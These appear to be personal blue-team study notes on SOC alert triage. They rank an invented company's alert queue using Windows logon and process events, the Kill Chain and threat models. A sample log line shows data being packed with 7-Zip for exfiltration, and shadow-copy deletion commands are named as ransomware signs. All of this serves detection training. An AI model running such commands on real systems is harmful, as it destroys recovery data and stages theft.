docs.title: Blue Team Essentials
docs.text:
What this section is

The data a SOC analyst looks at every day (DNS, HTTP, email, endpoint logs, …), each explained as why it matters → what it is → what it actually looks like → when a SOC uses it. Anything that changed recently is marked [Changed], anything that is commonly stated wrongly or is risky if done the old way is marked [Caution] / [Correction], and practical must-knows are marked [Added].

docs.title: Topics
docs.text:
• DNS

    DNS structure and record types, log collection and safe investigation, domain signals, unauthorised DNS, tunnelling, blockchain DNS, IDNs, encrypted DNS, and a suspicious-DNS triage sheet.

    DNS

  • HTTP

    Web servers and web shells, URL anatomy and phishing tricks, GET/POST and what gets logged, the other methods (CONNECT, HEAD, OPTIONS, PUT, DELETE, TRACE), reading request headers, judging real malicious requests (exploit kits, URLs inside URLs), response headers and status codes, new standards (HTTP/2, HTTP/3/QUIC, WebSocket), and practice questions with answers.

    HTTP

  • HTTP(S) Analysis & Attacks

    Attack stages over HTTP, choosing automated vs manual analysis, URL reputation and OPSEC, with phishing checks, sandboxing, header and content analysis, file extraction and HTTPS analysis to follow.

    HTTP(S) Analysis & Attacks

  • SMTP & Email

    The servers mail passes through (MUA, MTA, MDA) and their ports, SMTP conversations and envelope vs header addresses, reading headers, SPF results, DKIM signatures, DMARC alignment, policies and reports, and a triage checklist.

    SMTP & Email

  • Additional Network Protocols

    DHCP for turning an IP into a device and finding rogue devices, then SMB, SSH, RDP/VNC, PowerShell remoting, FTP, ICMP and remote-access tools used for lateral movement and exfiltration, plus why no protocol is "safe" and a summary of the network part.

    Additional Network Protocols

  • Endpoint Attacks

    What happens on the host after delivery: why the endpoint sees more than the network, initial exploitation (service-side vs client-side) and the evidence each leaves, then execution, persistence, discovery, privilege escalation, credential dumping, lateral movement, collection and exfiltration.

    Endpoint Attacks

  • Endpoint Defense

    Defence in depth on the host, stage by stage: software inventory and network scanning, continuous vulnerability scanning and patching, exploit protection and ASR rules, Credential Guard, host firewalls and antivirus, application control, FIM and persistence hunting, PAWs, permissions and privileges, EDR, DLP, UEBA and audit policy.

    Endpoint Defense

  • Windows Logging

    How Windows produces events: providers, the Event Log service, channels and .evtx files, audit policies, Sysmon and custom channels, event metadata (level, provider, event ID, task category, keywords), the General, Friendly and XML views of one event, the System vs EventData/UserData parts field by field, templates and descriptions, and the channels a SOC should collect.

    Windows Logging

  • Linux Logging

    How Linux and appliances log: the three meanings of "syslog" (format, daemon, network protocol), the RFC 3164 and RFC 5424 headers, free-text parsing, UDP/TCP/TLS transport, rsyslog and syslog-ng configuration, facility, severity and the PRI value, then the log files under /var/log, the systemd journal and command-line logging.

    Linux Logging

  • Important Events

    The events every analyst must read field by field: 4624/4625 logons and logon types, Status/SubStatus failure codes, 4648 explicit credentials, Linux SSH and desktop logins and their many failure shapes, then process creation, firewall and object access, services, tasks, USB, account changes, Defender, PowerShell and Kerberos.

    Important Events

  • Log Pipeline & SIEM

    How events travel from the host to your search bar and what changes on the way: the pipeline blocks and their delays, agents vs agentless collection, Windows Event Forwarding, vendor and third-party agents, rsyslog forwarding, log formats and structure, enrichment and correlation, normalisation and common information models, categorisation, storage tiers and the log life cycle.

    Log Pipeline & SIEM

  • File Analysis

    What a suspicious file really is, without trusting its name: bytes and hex dumps, the file command, magic bytes, nested files and carving, polyglots, Unicode and encodings, then strings, safe handling, dangerous file types (executables, scripts, Office, RTF, PDF), hashing and code signatures, quick triage, visual inspection, malicious scripts and data hidden in pictures.

    File Analysis

  • Alert Triage

    The start of the analysis part: what "dangerous" means in practice, attacks nearing completion and distance to the attacker's goal on the Kill Chain and attack life cycle, spotting exfiltration, destruction, sensitive targets and targeted attackers, and prioritising a real alert queue.

    Alert Triage

  • Perception & Memory

    Why validating an alert is harder than it looks: Heuer's psychology of analysis, perception as a filter, mindsets that stick, seeing what you expect, how SOC pressure causes premature closure, and the limits of memory and experience.

    Perception & Memory

  • Mental Models

    The analyst's toolbox of models: encapsulation and the OODA loop, the Cyber Kill Chain and campaigns, defence in depth, NIST CSF and the incident response cycle, threat-intelligence levels, cycles and F3EAD, the Diamond Model, attack trees, threat modelling, the Pyramid of Pain and MITRE ATT&CK.

    Mental Models

Next topic

The network part is complete (DNS, HTTP, HTTP(S) analysis, email, additional protocols), and so is the host part (endpoint attacks, endpoint defence, Windows logging, Linux logging, important events, log pipeline & SIEM, file analysis). The analysis part continues with alert triage and analyst perception and memory (both complete), then mental models; structured analysis, investigation questions, analysis OPSEC, reacting to intrusions and case review follow.

About these pages

Personal study notes. Not official guidance of any organisation.

docs.title: Alert Triage
docs.text:
In one line

The analysis part starts here: with more alerts than analysts, which one do you open next? This section turns the network and host knowledge from earlier sections into a ranking habit — what "dangerous" means in practice, how to tell an attack that is nearly finished from one that has barely started, how to spot exfiltration, destruction, sensitive targets and targeted attackers in alert data, and how to prioritise a real queue.

docs.title: Reading order
docs.text:
# Page Key points 1 Triage and Defining "Dangerous" — Attacks Nearing Completion and Distance to the Attacker's Goal Triage as emergency-department thinking, why FIFO and vendor severity alone fail; four meanings of "dangerous" (near completion, high-value target, advanced/targeted attacker, unique/lowest count) and the damage–cost–hard-to-undo test; why you need attacker goals in advance (threat-model table); clear late-stage signs; a privileged service account's 4624 type 10 + 4672 and a 4688 for password-protected split 7z read field by field (T1078.002, T1021.001, T1560.001); the Cyber Kill Chain stage table (attacker-side, host vs network), its linear weakness, the looping attack life cycle; a stage × asset × confidence score; an eight-alert queue linked by entity and ranked with reasons; practice questions 2 Spotting Exfiltration, Destruction, Sensitive Targets and Targeted Attacks in Alert Data Exfiltration as five attacker steps (access, stage, find a way out, prepare, upload) and a clue table; Zeek dns.log tunnelling read field by field and counted with zeek-cut/awk; an upload-heavy 4-hour conn.log line; a 4688 for rar a -hp -v500m from an admin share (T1560.001, T1074); egress probing in firewall denies; DLP/UEBA stacking; rclone to cloud storage (T1567.002); Base64 in a fake tracking-pixel URL (T1132.001, T1041); destruction early warnings: deployment servers (T1072), privileged accounts, GPO change in 5136 (T1484.001), sdelete/cipher /w/shred (T1485), raw-disk drivers in 7045 and Sysmon 6 (T1561), wiper families, shadow-copy deletion (T1490); pre-classified critical assets, an auto-updated lookup file, enrichment and Get-ADUser line by line; targeted-attack tells table and an opportunistic-vs-targeted phishing comparison; practice questions 3 Prioritising Alerts — IDS and Exploit Alerts, Same-Stage Alerts, Unique Alerts and What Can Wait A seven-alert IDS queue ranked from names and counts (sinkhole callbacks T1568/T1071.004, outbound TFTP T1048.003, internal xp_cmdshell T1190/T1059.003/T1505.001, packed download T1027.002, .scr mail T1566.001, camera probe T1595.002) with a Suricata eve.json alert read field by field; six questions for same-stage alerts applied to four exploit alerts; six exploit scenarios (Log4Shell, exploit kit T1189/T1203, Zerologon T1210 with 4742 and Netlogon 5827–5829, USB T1091/6416, HR-portal guessing T1110, macro to help desk T1204.002); long-tail analysis with cut | sort | uniq -c | sort -n and how rules count; lower-priority alert classes; 4625 sub-status codes, misconfigured printer vs spraying, 4740; the four-question triage card; practice questions

Section complete

The alert triage section is complete. Next: Perception & Memory — why validating the alert you picked is harder than it looks, and how perception, memory and SOC pressure lead analysts to the wrong answer.

docs.title: Things to remember
docs.text:
1. Triage by consequence, not arrival order; re-rank whenever new alerts arrive.
  2. Dangerous = would cause damage, cost a lot or be hard to undo if it succeeds.
  3. Order: near completion → high-value target → advanced/targeted → unique or lowest count.
  4. Write down your attackers' likely goals in advance; "near completion" means near those.
  5. Privileged accounts in the wrong place (4624 + 4672 on an unusual host) are a late-stage sign.
  6. Place every alert on an attack model and ask how many steps are left — remembering that intrusions loop.
  7. Link alerts by host, user and IP before ranking: three medium alerts can be one critical incident.
  8. Severity is the rule's opinion; danger is this event on this asset in this context.

docs.title: Triage and Defining "Dangerous" — Attacks Nearing Completion and Distance to the Attacker's Goal
Triage and Defining "Dangerous" — Attacks Nearing Completion and Distance to the Attacker's Goal
docs.text:
What this page covers

The first decision of every shift: which alert do I open next? We start with what triage is and why "oldest first" is the wrong answer, using the emergency-room picture and then turning it into SOC terms (limited analysts, many alerts, unequal consequences). Then we pin down what "dangerous" means in practice — four working definitions in priority order (attack near completion, high-value target, advanced or targeted attacker, rare or unique alert) and the single test behind all of them (damage, cost, difficulty to undo). We look closely at attacks nearing completion: why you must decide your attacker's likely goals in advance, and what the clear late-stage signs look like in real logs (exfiltration, imminent destruction, activity in protected enclaves and on locked-down hosts, odd use of highly privileged accounts — with Windows events 4624, 4672 and 4688 read field by field). Then we estimate distance to the goal with two attack models: the seven-step Cyber Kill Chain (and which steps are attacker-side, host-based or network-based) and the looping attack life cycle that better matches real intrusions. Finally we triage an invented queue of eight alerts, rank them and explain every decision. Practice questions with explanations at the end.

Labels

[Supplement] = practical material you need to know, [Correction] = a commonly repeated claim that is wrong or outdated, [Changed]/[Caution] = what has changed recently and what is risky to do the old way. The company (Kestrel Logistics), hostnames, accounts, domains and IPs are invented for illustration (.example, documentation and private IPs).

docs.title: The 8 key points
docs.text:
1. Triage is choosing which alert to work next when there are more alerts than analysts. It is a judgement about consequences, not a queue: the oldest alert is rarely the most important one.
  2. Ask one question every time you pick an alert: "Given the data I have right now, which of these situations would hurt us most if I ignored it for the next hour?"
  3. "Dangerous" has four working meanings, in this order: (1) an attack close to completing its goal; (2) an attack aimed at something high-value — a critical host, business process, user or data set; (3) signs of an advanced or targeted attacker; (4) a unique, never-seen or lowest-count alert.
  4. Behind all four is one test: would this cause damage, cost a lot, or be hard to undo if it succeeds? Time and damage both end up as money.
  5. You can only recognise "near completion" if you have decided in advance what attackers want from you (threat model, threat intelligence). Typical goals: steal data, destroy or encrypt data, reach a specific system, cause physical or operational harm.
  6. Clear late-stage signs: exfiltration, imminent destruction (ransomware, wipers), activity deep inside protected network zones, activity on heavily locked-down hosts, and highly privileged accounts used where they shouldn't be (4624 + 4672 on an unusual host).
  7. To estimate distance to the goal, place each alert on an attack model. The Cyber Kill Chain (Recon → Weaponisation → Delivery → Exploitation → Installation → C2 → Actions on Objectives) is the common reference; the later stages are the "danger area".
  8. The Kill Chain is linear, but real intrusions loop: escalate privilege, recon inside, move laterally, keep persistence — again and again until the target is reached. C2 on one desktop is bad; C2 on the file server holding the crown jewels is much closer to the end.

docs.title: Why this matters in a SOC
docs.text:
A SOC never has spare analysts. On a normal morning the queue holds dozens or hundreds of alerts, most of them false positives or low-impact noise, and somewhere in the pile there may be one that matters more than all the others combined. If you simply take the alert at the top — the oldest one — you are betting that alerts arrive in order of importance. They don't. A port scan that arrived at 08:02 will sit above a domain admin logging on to the finance database at 08:20, and an hour spent on the scan is an hour the intruder has on the database.

Triage is what turns "a pile of alerts" into "the next most valuable thing to look at". It is also where an analyst's knowledge of the network, the hosts and the business pays off: the whole earlier part of this training (what DNS, HTTP, logons and process creation look like) is what lets you read an alert title and estimate, in a few seconds, where the attacker is and what they could do next.

Two failure modes this page helps you avoid:

  • Working the queue first-in, first-out (FIFO). Fair to the alerts, unfair to the organisation.
  • Working by alert severity alone. The "Critical" label was set by a rule writer who did not know which host, which account, or which other alerts would be involved. Severity is one input, not the answer.

docs.title: Triage: think like an emergency department
docs.text:
Picture an emergency department. A patient with a sprained finger walks in two steps ahead of a patient with chest pain. Nobody thinks the finger should be seen first just because it arrived first. A triage nurse looks at each patient quickly, estimates how bad things will get if they wait, and orders the queue by urgency and consequence. An emergency dispatcher does the same with calls.

The SOC version has the same three ingredients:

  • Limited resources. A handful of analysts per shift. Every alert you open is another alert you are not opening.
  • Multiple problems at once. Alerts arrive continuously and many are unrelated.
  • Unequal consequences. Some alerts, if real and ignored, cost nothing; some cost the company.

And the same goal: pick the most dangerous (or most interesting) alert next. Back to the technical reality: triage is a fast, incomplete assessment. You are not investigating yet. You are reading the alert title, the host, the user, the time, and maybe one or two enrichment fields, and making a ranking decision under uncertainty. The full investigation (later sections) comes after you have picked.

[Supplement] Triage is a loop, not a one-off

Re-rank every time you finish a case or a new alert arrives. A medium alert can jump to the top when a second alert lands on the same host or user. Triage decisions also go stale: what was right at 08:05 may be wrong at 08:25.

docs.title: Defining "dangerous"
docs.text:
"Dangerous" sounds obvious until you have to rank eight alerts. Four working definitions, in the order you should apply them:

  1. Attack near completion. The attacker looks close to doing the thing they came for — data leaving, data about to be destroyed, a target system reached. Nothing outranks this.
  2. Targeting or affecting high-value items. If nothing is near completion, next comes anything aimed at what matters most: critical hosts (domain controllers, the ERP database, the OT gateway), critical business processes (payments, payroll, dispatch), critical users (domain admins, executives, finance staff who can move money, engineers with access to designs) and sensitive data. Example: a failed exploit attempt against a critical server, or malware on a laptop belonging to someone with access to sensitive data. These attacks may be past exploitation but not yet at their goal — they are "on track" to become definition 1.
  3. Advanced or targeted attackers. A targeted attacker chose you and wants something only you have — customer data, intellectual property, engineering plans, or simply the ability to wipe everything. That intent makes them more persistent and more damaging than opportunistic malware. The problem is spotting them: no alert is titled "targeted attacker here, act now". The next page covers the tell-tale signs.
  4. Unique, never seen before, or lowest count. When nothing else stands out, sort your alerts by how often each rule has fired and look at the bottom of the list. A rule that has fired once this month is far more likely to describe something new — including a real attack — than a rule that fires 4,000 times a day.

The bottom line that ties these together:

Dangerous = anything that would cause damage, cost a lot, or be hard to put right if it succeeds.

Why "cost" covers everything: downtime, recovery work, legal notification, lost contracts and staff hours all become money. A ransomware outage of the dispatch system, a leak of customer records and a week of rebuilding a domain are all, in the end, large numbers on a spreadsheet. An adware pop-up on a kiosk is a very small number.

[Correction] \"Dangerous\" is not the same as \"high severity\"

A "High" signature alert against a server that isn't vulnerable (wrong OS, patched, attack blocked) can be harmless. A "Low" alert — say, an unusual logon — on the domain controller can be the most dangerous thing in the queue. Severity describes the rule; danger describes this event, on this asset, in this context.

docs.title: You must know the goals in advance
docs.text:
"Near completion" means near completion of something. You can only judge distance to a goal if you know what the goal is likely to be. That is why this step depends on work done before the alert: a threat model (what do we have that someone would want, and who would want it?) informed by threat intelligence (who actually attacks organisations like ours, and how?).

For our invented company, Kestrel Logistics, the threat model might say:

Likely goal Who wants it What "the end" would look like Steal customer and shipment data Extortion crews, competitors Large uploads from file servers or the shipment database Encrypt or wipe IT systems Ransomware affiliates Mass file changes, shadow copies deleted, backups targeted Disrupt warehouse automation Hacktivists, state actors in a crisis Unusual access into the OT network, changes on HMI/PLC hosts Payment fraud Business-email-compromise crews Mailbox rules, changes to supplier bank details

With that table in your head, an alert stops being abstract. "7-Zip run on the shipment database server" maps directly to row 1.

docs.title: The clear signs
docs.text:
Some activity is so close to an attacker's goal that it should always jump the queue:

  • Data exfiltration. Data is already leaving, or being packed up to leave. (Next page: how to spot it.)
  • Imminent destruction of data. Ransomware or wiper behaviour: backups deleted, shadow copies removed, mass encryption starting. Minutes matter here.
  • Access to assets deep inside protected networks. If you have segmented the network — a payments zone, an OT zone, a management network — attacker activity inside that zone means they have already crossed several barriers.
  • Access to highly locked-down hosts. Systems where very few accounts are allowed to log on (domain controllers, privileged access workstations, backup servers). Any unexpected access is significant by design: the whitelist is short, so anything off it stands out.
  • Use of highly privileged accounts where they shouldn't be used. Domain admin, enterprise admin, backup operator, cloud global admin — logging on to an ordinary workstation, at 03:00, from a host they never use.

That last sign is worth seeing in real events. When an account logs on to a Windows machine, that machine writes 4624 ("An account was successfully logged on") to its Security log. If the new session also receives sensitive privileges — which is the case for administrators — the machine writes 4672 ("Special privileges assigned to new logon") immediately after, with the same Logon ID.

Event ID 4624  Computer: KL-FIN-DB01.corp.kestrel.example   2026-11-24 03:12:41
  Subject:            SecurityID S-1-0-0  LogonId 0x0
  Logon Type:         10
  New Logon:          AccountName svc_backup  AccountDomain KESTREL  LogonId 0x5A3F21C
  Network Information: WorkstationName KL-WS-0412  SourceNetworkAddress 10.20.4.112
  Authentication:     LogonProcess User32  AuthenticationPackage Negotiate

Event ID 4672  Computer: KL-FIN-DB01.corp.kestrel.example   2026-11-24 03:12:41
  Subject:            AccountName svc_backup  LogonId 0x5A3F21C
  Privileges:         SeBackupPrivilege SeRestorePrivilege SeDebugPrivilege
                      SeTakeOwnershipPrivilege SeImpersonatePrivilege ...

Field by field:

  • Event ID 4624 on KL-FIN-DB01 — the finance database server recorded a successful logon to itself. 4624 is always written on the machine being logged on to.
  • Logon Type: 10 — RemoteInteractive, i.e. Remote Desktop. Someone has a full desktop session on the database server (logon types).
  • AccountName svc_backup — a service account for backups. Service accounts normally run services (logon type 5) or batch jobs (type 4). A service account opening an interactive RDP session is already strange; at 03:12 even more so.
  • WorkstationName KL-WS-0412, SourceNetworkAddress 10.20.4.112 — the RDP session came from an ordinary user workstation. Backup administration should come from the backup server or an admin workstation, not from a desk in the logistics office.
  • LogonId 0x5A3F21C — the session's ID. Every later event from this session (processes, file access) carries it, so you can follow what the session did.
  • Event ID 4672 with the same LogonId — Windows granted this session sensitive privileges. SeBackupPrivilege/SeRestorePrivilege let it read and write any file regardless of permissions; SeDebugPrivilege lets it open other processes' memory (credential theft); SeTakeOwnershipPrivilege lets it take over any object. In short: whoever holds this session can read the whole database server.

Why attackers care: highly privileged service accounts are a favourite target precisely because they are powerful, rarely watched, often have old passwords and are often exempt from MFA. In ATT&CK terms this is T1078.002 Valid Accounts: Domain Accounts used for T1021.001 Remote Services: Remote Desktop Protocol. On a crown-jewel server, from a user workstation, that is the "end is near" picture: privilege plus position.

If the same session then runs an archiving tool, the host writes 4688 ("A new process has been created", when process-creation auditing is on):

Event ID 4688  Computer: KL-FIN-DB01   2026-11-24 03:19:07
  Creator Subject:  AccountName svc_backup  LogonId 0x5A3F21C
  New Process Name: C:\ProgramData\7z\7z.exe
  Creator Process:  C:\Windows\System32\cmd.exe
  Process Command Line: 7z.exe a -pK3str3l! -v200m C:\ProgramData\x\s.7z D:\Exports\Shipments\
  • LogonId 0x5A3F21C — the same RDP session from the 4624 above. One session, two alarming actions.
  • New Process Name C:\ProgramData\7z\7z.exe — 7-Zip running from ProgramData, not from Program Files: copied in, not installed.
  • a = add to archive; -p... = password-protect it (so DLP and proxies can't inspect the contents); -v200m = split into 200 MB volumes (easier to upload, less likely to trip size limits); D:\Exports\Shipments\ = the data being packed.
  • ATT&CK T1560.001 Archive Collected Data: Archive via Utility, a classic step right before exfiltration (TA0010).

Put these three events together and you no longer need to guess: this is an attack one step from its goal.

docs.title: Assessing distance to the attacker's goal
docs.text: For most alerts the picture is less clear. The habit to build: for every alert ask "what stage of an attack does this look like?" and therefore "how many steps are left before the attacker gets what they want?" Two models help.

docs.title: Model 1: the Cyber Kill Chain
docs.text:
The Cyber Kill Chain was published by Lockheed Martin researchers (Hutchins, Cloppert and Amin) in 2011 to describe the phases of a targeted intrusion. Seven steps:

# Stage What the attacker does Where you can see it Side 1 Reconnaissance Research targets: staff names, exposed services, email formats Web server logs, scans in firewall/IDS logs (often invisible: done on public sources) Mostly attacker side 2 Weaponisation Build the payload: malicious document, exploit + implant Almost never visible to you Attacker side 3 Delivery Send it: email, web download, USB, exposed service Email gateway, proxy, IDS Network 4 Exploitation The code runs: exploit fires or user opens the file EDR, process creation (4688/Sysmon 1), crash logs Host 5 Installation Persistence: service, run key, scheduled task, web shell EDR, 7045/4698, Sysmon 13 Host 6 Command & Control (C2) Implant talks to the attacker DNS, proxy, Zeek conn/ssl/http, firewall Network 7 Actions on Objectives Steal, encrypt, destroy, move further DLP, file access, large transfers, mass changes Host + network

Things worth noticing in that table:

  • Some stages happen mostly on the attacker's side. Recon (much of it) and weaponisation happen on the attacker's own systems or on public sources. You have very little data and very few chances to act there.
  • Some stages are host-based, others network-based. Exploitation and installation happen on a host, so host logs (EDR, process creation, service installs) are your best evidence. Delivery and C2 are movements of data, so network logs (email, proxy, DNS, Zeek) find them best. Knowing this tells you which data to pull first for an alert.
  • The "danger area" is the right-hand end. An alert at stage 3 (a blocked phishing email) is far from the goal. An alert at stage 6–7 (an implant talking out, data moving) is close.

docs.title: The weakness: real intrusions loop
docs.text: The Kill Chain is a straight line, but intrusions are not. Attackers rarely land directly on the system they want. They land on a receptionist's laptop, then need privileges, then need to find the right server, then move there, then often repeat. So C2 from a desktop is "stage 6", but the attacker may still be several hops from the goal; they will need interactive control of a more important host before they are truly "almost done". Reading the Kill Chain too literally makes every C2 alert look equally urgent.

docs.title: Model 2: the attack life cycle
docs.text:
A second widely used model (popularised in incident-response reporting as the targeted attack life cycle) draws the middle of an intrusion as a loop:

Initial recon → Initial compromise → Establish foothold →
    ┌─> Escalate privileges → Internal recon → Move laterally → Maintain presence ─┐
    └──────────────────────────────────────────────────────────────────────────────┘
                                                        → Complete mission
  • Initial compromise replaces weaponisation/delivery/exploitation/installation. It is more general — not every intrusion "installs" anything; often the attacker only needs a way to make one machine run their commands.
  • Establish foothold = a reliable way back in (a backdoor, a stolen VPN account) to use as a base.
  • The loop — escalate privileges, recon inside, move laterally, maintain presence — repeats on host after host. This is the part the Kill Chain hides.
  • Complete mission is reached only after enough laps that the attacker can touch the target.

Because it shows the repetition, this model is easier for newer analysts to map real alerts to. Its downside for triage: you can't say "stage 6 of 7, therefore nearly done", because there are many "lap" stages per intrusion. You have to interpret which lap you are seeing: is this lateral movement towards the crown jewels, or just between two user laptops?

docs.title: Putting a number on distance
docs.text:
[Supplement] Many SOCs make this explicit with a rough score. One simple version:

priority ≈ stage_weight × asset_weight × confidence
  • stage_weight — e.g. recon 1, delivery 2, exploitation 3, installation 4, C2 5, lateral/privilege 6, collection/exfil/impact 8.
  • asset_weight — from your asset list: ordinary workstation 1, server 2, crown jewel or privileged account 4.
  • confidence — how likely the alert is true: 0.2 for a noisy rule, 0.9 for a high-fidelity one or one confirmed by a second alert.

The numbers are invented and the exact values don't matter. What matters is that you deliberately combine where the attacker is, what they are touching and how sure you are, rather than reacting to whichever factor is loudest.

docs.title: Worked example: an eight-alert queue
docs.text:
It is 08:31 at Kestrel Logistics. You come back from a meeting to this queue, listed in arrival order:

# Time Source Alert Host / user A1 08:02 IDS SCAN inbound TCP port sweep from 203.0.113.50 DMZ range A2 08:05 Email gateway Phishing URL hxxps://kestrel-payroll.example/login — blocked, sent to 40 users 40 mailboxes A3 08:11 Antivirus Adware.BundleInstaller quarantined KL-WS-0388 (kiosk) / kiosk A4 08:14 EDR Periodic HTTPS beacon every 60 s to cdn-sync.example (198.51.100.77), process OneDriveSync.exe in %APPDATA% KL-WS-0412 / j.moreno A5 08:20 SIEM rule Privileged service account interactive logon: svc_backup 4624 type 10 + 4672 KL-FIN-DB01 from KL-WS-0412 A6 08:22 IDS WEB-APP remote code execution attempt against KL-WEB02 from 192.0.2.14 KL-WEB02 (public web) A7 08:25 EDR 7z.exe with password and split-volume flags KL-FIN-DB01 / svc_backup A8 08:30 EDR Unsigned kernel driver loaded — rule has fired once in 90 days KL-OT-HMI03 (warehouse OT zone)

Step 1 — look for links before ranking. A4, A5 and A7 share entities: A4 is on KL-WS-0412; A5 is an RDP logon from KL-WS-0412 to KL-FIN-DB01; A7 is on KL-FIN-DB01 under the same svc_backup account. That is very likely one intrusion seen three times: implant on a workstation (C2) → privileged lateral movement → staging data. Treat them as one case.

Step 2 — rank.

Rank Alert(s) Definition of "dangerous" Stage / distance Reasoning 1 A5 + A7 (+ A4) Near completion + high-value asset + privileged account Lateral movement done, collection/staging (T1560.001) — one step before exfil (TA0010) Privilege + crown-jewel server + data being packed with a password. Open now; consider immediate containment of KL-WS-0412 and disabling svc_backup (with the right approvals). 2 A8 Unique / lowest count + protected enclave Unknown — could be installation (driver = kernel access) in the OT zone One firing in 90 days, inside a segmented zone where very little should change. Could be a maintenance vendor; could be a rootkit or a raw-disk driver for destruction. Needs a look soon, ideally by a second analyst while the first works rank 1. 3 A6 Targeting a high-value item (public web app) Exploitation attempt Check whether it succeeded: HTTP response code and size, whether KL-WEB02 runs the targeted software, any new process from the web server process. If yes, it jumps to rank 1–2. 4 A2 — Delivery, blocked Blocked, but 40 targeted users and a look-alike payroll domain. Quick follow-ups: did anyone click from a device not behind the gateway? Is the same lure arriving via other paths? 5 A3 — Installation, cleaned Adware on a kiosk, quarantined. Low impact; close with a note or batch with similar alerts. 6 A1 — Recon, outside Internet background noise against the DMZ. Useful as context (did 203.0.113.50 later appear in A6?), not as a case.

Step 3 — what FIFO would have done. Working in arrival order, you would have spent the first half-hour on A1, A2 and A3 — scan, blocked email, quarantined adware — while svc_backup finished packing 200 MB volumes of shipment data on the finance database.

Step 4 — write down why. A one-line triage note per alert ("A6: attempt only, checking HTTP 500 response and process tree on KL-WEB02") makes the ranking reviewable and helps the next shift.

[Supplement] Group by entity, then rank

Most SIEMs and XDR tools can group alerts by host, user or IP into an "incident". Use it, but also check by hand: tools miss links when the attacker changes account (j.moreno → svc_backup) or when the link is a source address in a logon event rather than a shared hostname.

docs.title: The 2026 view
docs.text:
[2026 Current] Still valid

The core idea is unchanged: triage by consequence, not arrival order, and estimate where each alert sits in an intrusion and how close the attacker is to a goal you identified in advance. The four meanings of "dangerous" and the "damage, cost, hard to undo" test are still how experienced analysts rank. The Cyber Kill Chain remains the shared vocabulary for stages, and the looping life-cycle view is still the better picture of how intrusions actually progress. Windows 4624/4672/4688 remain the events that reveal privileged accounts used in the wrong place.

[Changed] What has changed

  • Faster intrusions, less time to triage. Mandiant's M-Trends 2026 (covering 2025 investigations) reports a global median dwell time of 14 days (11 the year before), but also that the hand-off from an initial-access broker to the follow-on group (often ransomware) dropped from more than eight hours in 2022 to a median of 22 seconds: the second group's tooling is pre-staged during the first infection. A "low" initial-access alert can therefore be minutes away from "near completion".
  • Extortion without encryption. Many ransomware operations now steal data and extort without encrypting (or encrypt only as a second step), and recent reporting describes attackers deliberately going after backups, identity services and hypervisors to deny recovery. "Near completion" signs therefore include access to backup consoles and virtualisation management, not only mass encryption.
  • Identity and cloud are now the "privileged accounts". Global admins in the cloud tenant, SaaS admin roles, OAuth app consent and token theft are today's equivalents of "domain admin on a workstation". Late-stage signs live in identity-provider and cloud audit logs as much as in Windows events.
  • ATT&CK has moved on. Since v19 (April 2026) the old Defense Evasion tactic is split into Stealth (TA0005) and Defense Impairment (TA0112), so Enterprise ATT&CK has 15 tactics; v20 (October 2026) added AI-related techniques. The IDs used on this page (T1078.002, T1021.001, T1560.001, TA0010) are unchanged.
  • Built-in asset and risk scoring. XDR/SIEM platforms now commonly tag critical assets and compute entity risk scores, and vendors ship AI triage agents that pre-sort alerts, write a first summary and propose a verdict. These help with volume, but they rank by what the tool knows; your threat model and asset knowledge still decide what "dangerous" means for your organisation.

[Caution] Wrong or risky to do the old way

  • Don't work the queue FIFO or by vendor severity alone. Combine stage, asset and confidence, and re-rank as alerts arrive.
  • Don't treat every Kill Chain stage-6 alert as equal. Ask which lap of the loop you are seeing and how close that host is to the target.
  • Don't assume a blocked or quarantined alert is finished. A blocked email sent to 40 users, or a quarantined file, can be the visible part of a delivery that worked elsewhere.
  • Don't accept an AI triage verdict without the evidence. Check the events it relied on; models can mis-rank rare, high-value alerts exactly because they are rare.
  • Don't skip the threat model. Without written-down attacker goals, "near completion" is guesswork — and the backup server, hypervisor console or OT zone may not be on anyone's watch list.

docs.title: Question 1
docs.text:
Your queue has: (a) IDS alert, outbound C2 signature from a sales laptop, 07:40; (b) "Critical" vendor alert, SQL injection attempt against your public website, 07:45; (c) SIEM alert, a Domain Admins account logged on with logon type 3 to the backup server from a help-desk PC, 07:50, followed by 4672. Rank them and explain using the definitions of "dangerous" and distance to the goal.

Answer and explanation

1st: (c). A Domain Admins account (privileged), on the backup server (high-value — backups are what you need to recover from ransomware, and attackers target them to deny recovery), from a help-desk PC (not an admin workstation). 4624 type 3 is a network logon (SMB, remote admin tools); 4672 confirms the session got special privileges. This is lateral movement with privilege towards a recovery-critical asset — close to the end.

2nd: (a). C2 from a laptop is stage 6 of the Kill Chain, but on one ordinary laptop the attacker is probably early in the loop. It is still a likely real compromise; also check whether the help-desk PC in (c) talked to the same destination.

3rd: (b). "Critical" is the rule's severity, not this event's danger. It is an attempt at exploitation. Check whether it succeeded (response codes and sizes, database errors, new processes from the web server); if it did, re-rank.

docs.title: Question 2
docs.text:
Why does judging "attack nearing completion" depend on a threat model, and give two examples of "the end is near" signs for an organisation whose main fear is ransomware.

Answer and explanation

"Near completion" means near the attacker's goal, and you can only measure distance to a goal you have identified. A threat model, informed by threat intelligence about who attacks organisations like yours, says what attackers want from you and therefore what the final steps would look like.

For a ransomware-focused threat model, examples: shadow copies being deleted (vssadmin delete shadows, wmic shadowcopy delete, T1490 Inhibit System Recovery); access to or changes on backup servers and consoles; a privileged account logging on to many servers in a short time; mass file renames or writes; data being archived and uploaded before encryption (double extortion); access to hypervisor management.

docs.title: Question 3
docs.text:
A colleague says: "The Kill Chain shows C2 at step 6 of 7, so every C2 alert means the attacker is almost done." What is wrong with this, and which model better shows why?

Answer and explanation

The Kill Chain is linear and hides the fact that intrusions loop. An attacker with C2 on one desktop usually still needs to escalate privileges, explore the network, move laterally and keep persistence — often several times — before they can reach the target. Only interactive control of the systems that hold or reach the goal is really "almost done".

The attack life cycle model shows this explicitly: initial compromise and foothold, then a repeating loop of escalate privileges → internal recon → move laterally → maintain presence, and only then complete mission. The cost is that you must interpret which lap you are on rather than read off a stage number.

docs.title: Spotting Exfiltration, Destruction, Sensitive Targets and Targeted Attacks in Alert Data
Spotting Exfiltration, Destruction, Sensitive Targets and Targeted Attacks in Alert Data
docs.text:
What this page covers

